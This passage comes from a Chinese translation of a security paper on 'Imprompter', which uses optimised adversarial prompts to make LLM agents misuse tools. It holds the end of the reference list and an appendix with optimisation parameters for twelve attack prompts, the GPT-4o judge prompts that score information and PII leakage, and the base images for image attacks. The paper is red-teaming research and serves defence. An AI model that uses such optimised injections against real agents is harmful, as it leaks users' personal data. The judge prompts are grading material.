+   Wen 等人（2024）Yuxin Wen、Neel Jain、John Kirchenbauer、Micah Goldblum、Jonas Geiping 和 Tom Goldstein. 2024. 让难题变得简单：基于梯度的离散优化用于提示调优和发现。*神经信息处理系统进展* 36（2024）。

+   Yi 等人（2023）Jingwei Yi、Yueqi Xie、Bin Zhu、Keegan Hines、Emre Kiciman、Guangzhong Sun、Xing Xie 和 Fangzhao Wu. 2023. 基准测试与防御大型语言模型的间接提示注入攻击。*arXiv 预印本 arXiv:2312.14197*（2023）。

+   Yu 等人（2023）Jiahao Yu、Xingwei Lin 和 Xinyu Xing. 2023. Gptfuzzer：通过自动生成的越狱提示对大型语言模型进行红队攻击。*arXiv 预印本 arXiv:2309.10253*（2023）。

+   Zhan 等人（2024）Qiusi Zhan、Zhixiang Liang、Zifan Ying 和 Daniel Kang. 2024. Injecagent：基准测试工具集成大型语言模型代理中的间接提示注入。*arXiv 预印本 arXiv:2403.02691*（2024）。

+   Zhao 等人（2024）Wenting Zhao、Xiang Ren、Jack Hessel、Claire Cardie、Yejin Choi 和 Yuntian Deng. 2024. WildChat：野外中的 100 万次 ChatGPT 交互日志。发表于*第十二届国际学习表征会议*。[https://openreview.net/forum?id=Bl8u7ZRlbM](https://openreview.net/forum?id=Bl8u7ZRlbM)

+   Zheng 等人（2024）Lianmin Zheng、Wei-Lin Chiang、Ying Sheng、Siyuan Zhuang、Zhanghao Wu、Yonghao Zhuang、Zi Lin、Zhuohan Li、Dacheng Li、Eric Xing 等人. 2024. 使用 mt-bench 和 chatbot arena 评估作为法官的 LLM。*神经信息处理系统进展* 36（2024）。

+   Zou 等人（2023）Andy Zou、Zifan Wang、J. Zico Kolter 和 Matt Fredrikson. 2023. 通用且可转移的对齐语言模型的对抗性攻击。arXiv:2307.15043 [cs.CL]

## 附录 A 附录

### A.1\. 优化参数

由于在提案选择阶段涉及随机性（$p$ 个从 $k$ 个 token 中随机选择），尝试不同的算法参数组合和/或在相同设置下进行多次实验是合理的。计算环境将约束 $p$ 和 $s$ 的选择。同时，示例的 token 长度 $n$ 越大，优化就越容易，但速度较慢。通过经验确定与计算环境特定的 $n$ 范围将是有益的。我们在表[7](https://arxiv.org/html/2410.14923v2#A1.T7 "表 7 ‣ A.1\. 优化参数 ‣ 附录 A 附录 ‣ 披露与回应 ‣ 致谢 ‣ 8\. 结论 ‣ 提示优化 ‣ 7\. 相关工作 ‣ 开放权重访问与黑盒 ‣ 6\. 讨论与局限性 ‣ 攻击失败时会发生什么？ ‣ 真实产品上的结果 ‣ 本地 LLM 上的结果 ‣ 指标 ‣ 数据集构建 ‣ 5.2\. PII 泄露攻击 ‣ 本地视觉 LLM 上的结果 ‣ 真实产品上的结果 ‣ 本地文本 LLM 上的结果 ‣ 指标 ‣ 训练数据集构建 ‣ 5.1\. 信息泄露攻击 ‣ 5\. 评估 ‣ Imprompter：诱使 LLM 代理使用不当工具"). 中报告了其他优化参数以及用于优化的步骤数。我们报告了 $\lambda$、$p$、$s$ 和 vocab_mask。在所有实验中，选择的 top 候选数 $k$ 始终设置为 256。需要注意的是，对于 T5-T8，我们不是在每一轮随机选择一个子集，而是在训练前选择一个固定的子集。固定子集有助于评估候选提示的性能，但牺牲了通过探索更多训练示例所提供的泛化能力。

表 7. 为所训练的攻击参数以及优化过程中使用的步数，其中 $\lambda$、$p$ 和 $s$ 分别表示语法权重、每个位置随机抽样的 token 数量和子集大小。vocab_mask 表示用于优化的词汇表。

| # | $\lambda$ | p | s | vocab_mask | 步数 |
| --- | --- | --- | --- | --- | --- |
| T1 | 1 | 6 | 24 | all_allow | 147 |
| T2 | 1 | 6 | 24 | all_allow | 125 |
| T3 | 0 | 8 | 24 | 非英语 | 89 |
| T4 | 0 | 6 | 24 | 非英语 | 127 |
| T5 | 0.1 | 6 | 36 | all_allow | 135 |
| T6 | 0.5 | 6 | 36 | 非英语 | 77 |
| T7 | 1 | 6 | 24 | all_allow | 95 |
| T8 | 1 | 6 | 24 | 非英语 | 22 |
| T9 | 1 | 6 | 24 | all_allow | 153 |
| T10 | 1 | 6 | 24 | all_allow | 59 |
| T11 | 0.35 | 6 | 24 | all_allow | 56 |
| T12 | 0.35 | 6 | 24 | 非英语 | 53 |

### A.2\. 提示列表

我们利用 GPT-4-o 计算了信息泄露率（词汇提取 GPT 得分）和个人身份信息（PII）泄露率（上下文 GPT 得分）。我们展示了这两个任务所使用的提示：

提示查询 GPT-4-o 的词汇提取 GPT 分数。{minted}[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]text 我将展示一份从你我之间上述对话中提取的关键词列表。如果你认为它捕捉到了我们对话中的某些关键词，请返回 True。否则，返回 False。你是在判断这些关键词是否存在，而不是完整性。你应该始终返回 True 或 False，且不带格式的纯文本。\n\n列表：\n关键词\n\n你的判断回答：\n

提示查询 GPT-4-o 的上下文 GPT 分数。{minted}[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]text 以下字符串是否提供了有关我先前请求的主题、请求的意图或我所涉及事务的任何信息？仅用 True 或 False 回答。记住，我是询问存在性，所以只要提供了我上述所请求的某些信息，你就应返回 True。\n\n列表：\n关键词\n\n你的判断回答：\n

### A.3\. 图像攻击的基础图像

图[4](https://arxiv.org/html/2410.14923v2#A1.F4 "图 4 ‣ A.3\. 图像攻击的基础图像 ‣ 附录 A 附录 ‣ 披露与响应 ‣ 致谢 ‣ 8\. 结论 ‣ 提示优化 ‣ 7\. 相关工作 ‣ 开放权重访问与黑盒 ‣ 6\. 讨论与局限性 ‣ 攻击失败时会发生什么？ ‣ 在真实产品上的结果 ‣ 在本地 LLM 上的结果 ‣ 评估指标 ‣ 数据集构建 ‣ 5.2\. 个人信息泄露攻击 ‣ 在本地视觉 LLM 上的结果 ‣ 在真实产品上的结果 ‣ 在本地文本 LLM 上的结果 ‣ 评估指标 ‣ 训练数据集构建 ‣ 5.1\. 信息泄露攻击 ‣ 5\. 评估 ‣ Imprompter: 诱导 LLM 代理使用不当工具") 展示了我们用于图像攻击的六个基础图像。第一个是著名的 AI 生成的羊驼图片，接下来四张是随机从 Shutterstock^(11)^(11)11[https://www.shutterstock.com/](https://www.shutterstock.com/) 图像库中抽取的图像，最后一张是纯白色的图像。

![参见说明](img/9e386aae4511b9ed4cdffb6ba836183b.png)

((a)) V1

![参见说明](img/bae7081e73ed9eb71cb5889e90e922ea.png)

((b)) V2

![参见说明](img/636c631482786909dc0230d321a6202f.png)

((c)) V3

![参见说明](img/ac1dedc5cf2195df62bc70d24f5ff78b.png)

((d)) V4

![参见说明](img/f4e42ee71cbf2d6724f22afc308702b4.png)

((e)) V5

![参见说明](img/0c65120d84eaad375693fe9ca6470c46.png)

((f)) V6

图 4. 图[3](https://arxiv.org/html/2410.14923v2#S5.F3 "图 3 ‣ 在本地视觉 LLM 上的结果 ‣ 在真实产品上的结果 ‣ 在本地文本 LLM 上的结果 ‣ 评估指标 ‣ 训练数据集构建 ‣ 5.1\. 信息泄露攻击 ‣ 5\. 评估 ‣ Imprompter: 诱导 LLM 代理使用不当工具") 中的对抗图像基础图像。
